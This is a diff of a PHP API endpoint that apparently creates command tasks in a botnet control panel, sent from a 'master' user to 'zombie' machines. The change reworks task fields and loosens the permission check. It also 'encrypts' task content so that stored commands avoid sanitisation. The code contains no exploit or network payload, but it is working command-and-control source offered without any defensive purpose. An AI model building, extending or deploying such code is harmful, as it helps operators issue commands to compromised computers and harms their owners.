@@ -19,7 +19,8 @@ include_once 'config/database.php';
 include_once 'objects/task.php';
 
 // auxilar functions
-include_once 'aux_functions/check_permission.php';
+include_once 'util/check_permission.php';
+include_once 'util/crypt.php';
  
 // get posted data
 $data = json_decode(file_get_contents("php://input"));
@@ -37,36 +38,33 @@ if($jwt){
         $decoded = JWT::decode($jwt, $key, array('HS256'));
         // Check who request and permission
         $requested_by = $decoded->data->username;
-        $to_update = $data->zombie_username;
         // this function raise exceptions in case of error (not requested by a master, or requesting changes on another master)
-        check_master_permissions($requested_by, $to_update);
+        check_master_permissions($requested_by);
 
         // get database connection
         $database = new Database();
         $db = $database->getConnection();
         
-        // instantiate user object
         // instantiate task object
         $task = new Task($db);
         
         // set task property values
+        // light encryption of task content, not for security porpuses but to avoid strip any char when sanitize 
+        // (commands and other text that could be included here as a task don't be sanitized but crypted when creating and decrypted at reading)
+        // this way of "packing" also allow to store in db nested data as a unique field
+        $task->task_content = (isset($data->task_content)) ? encrypt(json_encode($data->task_content), $key) : "";
+        $task->task_name = $data->task_name;
         $task->task_type = $data->task_type;
-        $task->task_content = $data->task_content;
         $task->master_username = $requested_by;
         $task->to_exec_at = $data->to_exec_at;
         $task->to_stop_at = $data->to_stop_at;
-        $task->zombie_username = $data->zombie_username;
-        $task->readed = $data->readed;
-        $task->running = $data->running;
-        $task->result = $data->result;
-        $task->exec_at = $data->exec_at;
+        $task->manual_stop = $data->manual_stop;
 
-        //print_r($data->task_content);
 
         // create the task
         if(
+            !empty($task->task_name) &&
             !empty($task->task_content) &&
-            !empty($task->zombie_username) &&
             !empty($task->master_username) &&
             //!empty($task->username) &&
             //!empty($task->public_ip) &&
@@ -78,8 +76,10 @@ if($jwt){
             // set response code
             http_response_code(200);
         
-            // display message: task was created
-            echo json_encode(array("message" => "task was created."));
+            echo json_encode(array(
+                "message" => "Task was created.",
+                "id" => $task->id
+            ));
         }
         
         // message if unable to create task
